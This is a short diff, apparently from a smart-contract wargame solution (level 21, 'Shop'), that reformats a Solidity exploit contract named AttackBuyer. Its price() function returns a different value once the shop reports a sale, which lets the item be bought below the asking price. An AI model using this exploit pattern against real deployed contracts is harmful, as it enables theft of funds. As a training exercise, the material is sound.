+++ src/levels/21-Shop/AttackShop.sol
@@ -1,17 +1,17 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import './Shop.sol';
+import "./Shop.sol";
 
-contract AttackBuyer is Buyer{
+contract AttackBuyer is Buyer {
     Shop immutable victim;
 
     constructor(Shop _victim) {
         victim = _victim;
     }
 
-    function price() external view returns(uint) {
-        if(victim.isSold() == true) {
+    function price() external view returns (uint256) {
+        if (victim.isSold() == true) {
             return 0;
         }
         return 110;
